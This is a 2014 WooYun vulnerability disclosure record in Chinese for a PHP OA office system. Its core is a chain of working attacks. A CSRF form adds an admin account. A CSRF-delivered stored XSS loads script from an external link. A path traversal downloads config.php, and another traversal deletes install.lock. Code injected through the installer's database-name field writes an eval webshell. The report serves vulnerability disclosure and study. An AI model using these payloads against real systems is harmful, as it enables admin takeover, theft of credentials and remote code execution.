{"id": 1587, "wybug_id": "wooyun-2014-063844", "wybug_title": "天生创想OA办公系统漏洞大礼包(xss,csrf,下载,删除,写shell)", "wybug_corp": "天生创想", "wybug_author": "JJ Fly", "wybug_date": "2014-06-07 11:58", "wybug_open_date": "2014-09-05 12:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向公众公开  简要描述： 某OA办公系统漏洞大礼包(xss,csrf,下载,删除,写shell) 详细说明：  注：部分重复首先我们在网站http://www.phpoa.cn/下载一份 本地安装。程序安装地址 \nhttp://192.168.1.114/install/install.php\n1.先来一发csrf。\n\n\n\n抓包如下  未发现任何防护措施 。\n\n附上利用代码 （添加的还是管理员哦。）\n<form method='post' action='http://192.168.1.114/admin.php?ac=user&fileurl=mana&do=add'>\t<input type='text' name='view' value='edit'>\t<input type='text' name='username' value='testaaa2'>\t<input type='text' name='password' value='testaaa2'>\t<input type='text' name='groupid' value='1'>\t<input type='text' name='departmentid' value='0'>\t<input type='text' name='name' value='testaaa2'>\t<input type='text' name='ischeck' value='1'>\t<input type='text' name='keytype' value='2'></form><script>\tdocument.forms[0].submit();</script>\n2.来一发xss+csrf发送短消息这。  需要好好过滤一下！\n\n\n\n下面我们来抓一下发送消息的数据包。\n\n同样没有防护措施。我们继续构造一下 csrf\n<form method='post' action='http://192.168.1.114/admin.php?ac=sms_online&do=save&fileurl=sms'>\t<input type='text' name='savetype' value='add'>\t<input type='text' name='receiveperson' value='管理员'>\t<input type='text' name='content' value='<ScRipt/src=http://t.cn/********I></scRiPt>'></form><script>\tdocument.forms[0].submit();</script>\n来张效果图\n\n\n\n好了，这样的话 ，只要随便有一个人中招就可以拿下他的管理员后台了。3.再来一发任意文件下载\nhttp://192.168.1.114/down.php?urls=data/../config.php\n漏洞 详情 请看源代码\n<?php//下载文件define('IN_ADMIN',True);require_once('include/common.php');get_login($_USER->id);$filename=$_GET['urls'];$phps=explode('/',$filename);if($phps[0]!='data' && $phps[0]!='ntko'){\techo '下载失败！';\texit;}$phps1=explode('.',$filename);if($phps1[1]=='php'){\techo '下载失败,请不要非法下载！';\texit;}header(\"Content-Type: application/force-download\");header(\"Content-Disposition: attachment; filename=\".basename($filename));  readfile($filename);?>\n程序用 /进行分割 却只检测 $phps[0] 是不是为data 和ntko 然后不用 .进行分割  只检测$php1[1]直接用 data/../config.php  就可以下载配置文件了。。不过就想这样 拿到shell 还是不行的 4.任意文件删除先随便备份一张表 然后再进行删除系统设置-》\n\n来抓包\n\n我们来 构造下 把install.lock删除掉 。C:\\wamp\\www\\data\\db\\test.sqlC:\\wamp\\www\\cache\\install.lock好的 ..\\..\\cache\\install.lock\n\nPost一下修改好的数据 然后你就会发现 install.lock被删除掉了 好了 install.lock删除掉了 我们来准备我们的shell吧。5.修改config.php删除掉install.lock之后 打开网址  \nhttp://192.168.1.114/install/install.php\n下一步两次 然后到了第三步\n\n还记得 上面下载的config文件吗。我们把 数据库用户名 和密码 都输入正确的 然后 在数据库名称中输入 aa');eval($_POST[0]);//然后下一步。\n\nconfig.php 中的'前加上了一个\\   不过不要紧 我们返回上一部我们只需要在数据库名称中输入aa然后下一步 即可\n\n我们去看下config.php\n\n\n\n好吧这是为什么呢。下面附上关键代码\n$content = preg_replace(\"/define\\('DB_HOST','(.*?)'\\);/is\", \"define('DB_HOST','$dbhost');\", $content);$content = preg_replace(\"/define\\('DB_USER','(.*?)'\\);/is\", \"define('DB_USER','$dbuser');\", $content);$content = preg_replace(\"/define\\('DB_PWD','(.*?)'\\);/is\", \"define('DB_PWD','$dbpwd');\", $content);$content = preg_replace(\"/define\\('DB_NAME','(.*?)'\\);/is\", \"define('DB_NAME','$dbname');\", $content);$content = preg_replace(\"/define\\('DB_TABLEPRE','(.*?)'\\);/is\", \"define('DB_TABLEPRE','$dbprefix');\", $content);file_put_contents($confile, $content);\n好吧 大礼包 到此结束！   漏洞证明：  \n\n\n\n   修复方案：  你们更专业！！   版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-06-12 08:58 厂商回复： 根据此前天生创想对http:///bugs/wooyun-2014-的拒绝处置情况，CNVD拟再次联系该公司尝试通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-25 18:56 |    \t\tdlevr \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:10        | 菜鸟一只，大神勿喷！)\t\t \n  这公司这么叼，不如直接公布漏洞吧，让我们研究研究！    \n     2014-07-02 10:30 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  拒绝处置啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}